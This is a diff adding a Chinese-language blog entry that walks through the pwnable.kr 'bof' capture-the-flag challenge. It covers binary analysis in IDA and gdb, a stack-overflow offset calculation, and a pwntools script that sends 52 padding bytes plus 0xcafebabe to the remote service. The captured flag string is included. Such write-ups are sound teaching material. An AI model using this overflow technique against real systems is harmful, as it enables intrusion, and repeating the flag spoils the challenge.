@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>bof</title>
+      <link href="/2021/10/28/bof/"/>
+      <url>/2021/10/28/bof/</url>
+      
+        <content type="html"><![CDATA[<p>1：先看题目</p><p><img src="clip_image002.jpg" alt="clip_image002"></p><p>Windows:将地址复制粘贴至浏览器即可下载</p><p>Linux：开启root权限，使用wget指令即可下载本题文件</p><p>  $ wget <a href="http://pwnable.kr/bin/bof">http://pwnable.kr/bin/bof</a></p><p>  $ wget <a href="http://pwnable.kr/bin/bof.c">http://pwnable.kr/bin/bof.c</a></p><p>2：Linux下使用file指令查看bof文件信息</p><p><img src="clip_image003.png" alt="clip_image003"></p><p>32-bit可知bof文件为32位文件</p><p>3：打开32位ida，将bof二进制可执行文件拖入其中</p><p>进行一些基本操作可得到如下结果，如图</p><p>图一：main函数</p><p>图二：func函数</p><p><img src="clip_image005.jpg" alt="clip_image005"></p><p><img src="C:\blog\source_posts\bof.assets\clip_image006.png" alt="img"></p><p>简要分析可知：在远端服务器执行该文件，并且当a1的值为-889275714时，即可拿到远端服务器的shell，进而得到你想要的flag，to win</p><p>5：</p><p><img src="clip_image007.png" alt="clip_image007"></p><p>Gdb打开bof文件</p><p><img src="clip_image008.png" alt="clip_image008"></p><p>在main函数处设置断点并执行文件</p><p><img src="clip_image009.png" alt="clip_image009"></p><p><img src="clip_image011.jpg" alt="clip_image011"></p><p><img src="clip_image013.jpg" alt="clip_image013"></p><p>在idamain函数中使用Hex…我们发现这两个数据相同，自己领会</p><p><img src="clip_image014.png" alt="clip_image014"></p><p>刚运行至我们设置的断点处，指针停在了这个位置</p><p><img src="clip_image015.png" alt="clip_image015"></p><p>离我们的func函数仅有三步之遥</p><p><img src="clip_image016.png" alt="clip_image016"></p><p>此时我们执行四次si指令即可进入func函数，结果如下</p><p><img src="clip_image017.png" alt="clip_image017"></p><p>查看栈段：</p><p><img src="clip_image019.jpg" alt="clip_image019"></p><p>得到内存的栈段中func函数的末尾地址0xffffd130</p><p>利用x/50wx 0xffffd130，从栈地址0xffffd130向高位打印50个内存地址（一个地址四字节）</p><p><img src="clip_image021.jpg" alt="clip_image021"></p><p>结果如上图，第一个0x61616161便是我们输入的数组s的初始值（即s[0]），0xdeadbeef即为我们main函数中的传入func的参数，因此我们只需要输入80-4c = 34（转换为十进制即为52），输入52个任意字符外加目标字符“0xCAFEBABE”即可解决此题</p><p>构造的脚本如下：</p><p><img src="clip_image022.png" alt="clip_image022"></p><p>结果如下：</p><p><img src="clip_image023.png" alt="clip_image023"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*                          <span class="comment">#导入pwn模块</span></span><br><span class="line">p = remote(<span class="string">&quot;pwnable.kr&quot;</span>,<span class="number">9000</span>)             <span class="comment">#连接远端服务器</span></span><br><span class="line">p.sendline(<span class="string">&#x27;A&#x27;</span>*(<span class="number">0x34</span>) + p32(<span class="number">0xcafebabe</span>))  <span class="comment">#发送payload</span></span><br><span class="line">p.interactive()                           <span class="comment">#接收远端服务器交互</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat flag</span><br><span class="line">daddy, I just pwned a buFFer :)</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>攻防世界-hello_pwn</title>
       <link href="/2021/10/27/Note/"/>
       <url>/2021/10/27/Note/</url>
